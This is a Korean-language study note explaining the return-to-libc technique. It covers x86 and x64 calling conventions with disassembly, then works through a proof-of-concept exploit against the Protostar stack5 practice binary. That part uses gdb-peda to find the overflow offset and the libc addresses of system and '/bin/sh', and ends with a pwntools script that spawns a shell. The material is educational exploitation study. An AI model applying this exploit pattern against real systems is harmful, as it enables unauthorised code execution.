# 02. Return to Libc
* 리턴어드레스를 공유 라이브러리(Libc) 함수의 주소로 변경하여, 해당 함수 호출
  * 일반적으로 system 함수를 호출하여 /bin/sh를 실행하는 방법 사용
* NX bit(DEP)를 우회하는 데 사용



## (1) 선행지식. Calling Convention
* 리눅스에서는 Cdecl 호출 규약을 사용
* x86과 x64가 다름: x86은 스택에, x64는 레지스터를 이용하다가 스택을 이용

#### x86

* 함수 인자값을 스택에 저장/ 오른쪽에서 왼쪽 순으로 스택에 쌓임

* 함수 리턴값은  eax 레지스터에 저장

* 스택정리는 호출한 함수가 담당(호출된 함수 아님)

  ```c
  #include<stdio.h>

  void function(int a, int b, int c, int d, int e, int f, int g, int h){
    printf("%d %d %d %d %d %d %d %d", a, b, c, d, e, f, g, h);
  }
  void main(){
    function(1,2,3,4,5,6,7,8);
  }
  ```

  ```shell
     0x080491c0 <+27>:	push   0x8
     0x080491c2 <+29>:	push   0x7
     0x080491c4 <+31>:	push   0x6
     0x080491c6 <+33>:	push   0x5
     0x080491c8 <+35>:	push   0x4
     0x080491ca <+37>:	push   0x3
     0x080491cc <+39>:	push   0x2
     0x080491ce <+41>:	push   0x1
     0x080491d0 <+43>:	call   0x8049162 <function>
  ```

* 스택에 함수의 인자값을 오른쪽부터(8,7,6...1) 넣고 함수를 호출함을 알 수 있음

* 인자를 넣고 함수를 호출하므로 아래와 같은 메모리 구조를 갖게 됨

  ```
  (높)-----------------
  	   인자
      -----------------
  	함수종료후 돌아갈 RET
  (낮)------------------
  ```

* 호출된 함수에서 인자값 사용은 아래와 같이 진행됨

  ```
     0x08049176 <+20>:	push   DWORD PTR [ebp+0x24]
     0x08049179 <+23>:	push   DWORD PTR [ebp+0x20]
     0x0804917c <+26>:	push   DWORD PTR [ebp+0x1c]
     0x0804917f <+29>:	push   DWORD PTR [ebp+0x18]
     0x08049182 <+32>:	push   DWORD PTR [ebp+0x14]
     0x08049185 <+35>:	push   DWORD PTR [ebp+0x10]
     0x08049188 <+38>:	push   DWORD PTR [ebp+0xc]
     0x0804918b <+41>:	push   DWORD PTR [ebp+0x8]
  ```

* ebp+0x8부터 인자가 저장되어 있음을 확인할 수 있다.

* ebp+0x4는 해당함수 종료후 돌아갈 리턴어드레스가 저장된다.  

* ebp에는 이전 호출 프레임이 저장되어 있다.



#### X64

* 레지스트리에 6개까지 저장한 후 이후는 스택에 저장

* edi, esi, edx, ecx, r8d, r9d 순으로 매칭

  ```
     0x000000000040117e <+0>:	push   rbp
     0x000000000040117f <+1>:	mov    rbp,rsp
     0x0000000000401182 <+4>:	push   0x8
     0x0000000000401184 <+6>:	push   0x7
     0x0000000000401186 <+8>:	mov    r9d,0x6
     0x000000000040118c <+14>:	mov    r8d,0x5
     0x0000000000401192 <+20>:	mov    ecx,0x4
     0x0000000000401197 <+25>:	mov    edx,0x3
     0x000000000040119c <+30>:	mov    esi,0x2
     0x00000000004011a1 <+35>:	mov    edi,0x1
     0x00000000004011a6 <+40>:	call   0x401122 <function>
     0x00000000004011ab <+45>:	add    rsp,0x10
     0x00000000004011af <+49>:	nop
     0x00000000004011b0 <+50>:	leave
     0x00000000004011b1 <+51>:	ret
  ```

* 레지스트리와 스택에 인자값을 넣은 후 function을 call하면서 종료후 복귀할 주소인 0x4011ab를 ret로 스택에 넣음

* function에서 push rbp로 이전 호출 프레임 넣음

  ```
  gdb-peda$ i r $rbp
  rbp            0x7fffffffe4a0	0x7fffffffe4a0
  gdb-peda$ conti
  ```



* 따라서 아래와 같은 스택 모양이 만들어짐

  ```
  (높)------------------
     8
  ----------------------
     7
  ----------------------
     ret(0x4011ab)
  ----------------------
     rbp(0x7fffffffe4a0)
  (낮)------------------
  ```



## (2) 공격 설명

* 함수를 호출하면 ret 뒤 4바이트에 인자가 들어감

* 만약 시스템 함수를 ret 조작을 통해 호출하면 시스템함수 종료후 돌아갈 주소 ret가 스택에 삽입되고 이 ret의 4바이트 뒤, 즉 조작된 ret의 8바이트 뒤에 인자값을 넣어야함

  ```
  (높)------------------
     "/bin/sh"
     -------------------
     system 함수 종료후 ret
     -------------------
     ret -> system 함수주소
  (낮)-------------------

  ```

### 공격  PoC

* protostar stack5 바이너리 이용(Protostar/bin)

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```

```shell
gdb-peda$ disass main
Dump of assembler code for function main:
   0x080483c4 <+0>:	push   ebp
   0x080483c5 <+1>:	mov    ebp,esp
   0x080483c7 <+3>:	and    esp,0xfffffff0
   0x080483ca <+6>:	sub    esp,0x50
   0x080483cd <+9>:	lea    eax,[esp+0x10]
   0x080483d1 <+13>:	mov    DWORD PTR [esp],eax
   0x080483d4 <+16>:	call   0x80482e8 <gets@plt>
   0x080483d9 <+21>:	leave
   0x080483da <+22>:	ret
End of assembler dump.
gdb-peda$ b *main+22
Breakpoint 1 at 0x80483da: file stack5/stack5.c, line 11.
gdb-peda$ pattern create 100
'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
gdb-peda$ r
Starting program: /root/Study/LinuxExTech/02.ReturnToLibc/stack5
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
gdb-peda$ x/s $esp
0xffffd5ec:	"AA4AAJAAfAA5AAKAAgAA6AAL"
gdb-peda$ pattern offset AA4AAJAAfAA5AAKAAgAA6AAL
AA4AAJAAfAA5AAKAAgAA6AAL found at offset: 76
gdb-peda$
gdb-peda$ p system
$1 = {<text variable, no debug info>} 0xf7e09980 <system>
gdb-peda$ find '/bin/sh'
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f49aaa ("/bin/sh")
```

```python
root@attacker:~/Study/LinuxExTech/02.ReturnToLibc# cat ex_rtl1_32.py
from pwn import *

OFFSET = 76

dummy = p32(0xffffffff)
system = p32(0xf7e09980)
binsh = p32(0xf7f49aaa)

p = process(['stack5'])

payload = "A" * OFFSET + system + dummy + binsh

p.sendline(payload)
p.interactive()
```
